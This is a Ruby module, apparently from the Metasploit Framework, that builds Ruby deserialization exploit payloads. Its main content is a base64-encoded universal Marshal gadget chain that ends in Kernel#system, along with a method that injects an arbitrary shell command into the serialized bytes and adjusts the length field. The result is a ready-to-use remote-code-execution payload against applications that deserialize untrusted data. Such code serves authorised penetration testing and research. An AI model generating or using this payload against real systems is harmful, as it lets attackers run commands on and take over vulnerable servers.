# -*- coding: binary -*-

# Ruby deserialization Utility
module Msf
  module Util
    # Ruby deserialization class
    class RubyDeserialization
      # That could be in the future a list of payloads used to exploit the Ruby deserialization vulnerability.
      # TODO: Add more payloads
      # TDOO: Create a json file with the payloads?
      PAYLOADS = {
        'Universal' => {
          'status' => 'dynamic',
          'length_offset' => 309,
          'buffer_offset' => 310,
          # https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
          'bytes' => 'BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIhlTR1Y1WkdWeVFXNWtjbUZrWlNBZwY6BkVUOhJAZGVidWdfb3V0cHV0bzoWTmV0OjpXcml0ZUFkYXB0ZXIHOgxAc29ja2V0bzoUR2VtOjpSZXF1ZXN0U2V0BzoKQHNldHNvOw4HOw9tC0tlcm5lbDoPQG1ldGhvZF9pZDoLc3lzdGVtOg1AZ2l0X3NldEkiBQY7DFQ7EjoMcmVzb2x2ZQ=='
        }
      }.freeze
      def self.payload(payload_name, command = nil)
        payload = PAYLOADS[payload_name]

        raise ArgumentError, "#{payload_name} payload not found in payloads" if payload.nil?

        bytes = Rex::Text.decode_base64(payload['bytes'])

        length = [command.length.ord + 5 ].pack('C*')

        bytes[payload['buffer_offset'] - 1] += command
        bytes[payload['length_offset']] = length

        bytes.gsub!('SGV5ZGVyQW5kcmFkZSAg', Rex::Text.rand_text_alphanumeric(20))

        bytes
      end

      def self.payload_names
        PAYLOADS.keys
      end

    end
  end
end
